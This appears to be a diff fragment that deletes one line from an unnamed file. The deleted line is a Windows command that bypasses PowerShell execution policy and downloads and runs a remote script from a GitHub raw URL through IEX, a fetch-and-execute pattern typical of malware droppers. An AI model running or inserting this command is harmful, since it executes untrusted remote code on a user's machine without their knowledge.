@@ -1,1 +1,0 @@
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile IEX (New-Object Net.WebClient).DownloadString('https://github.com/wangzhizhun/mailchm/raw/master/start.ps1')
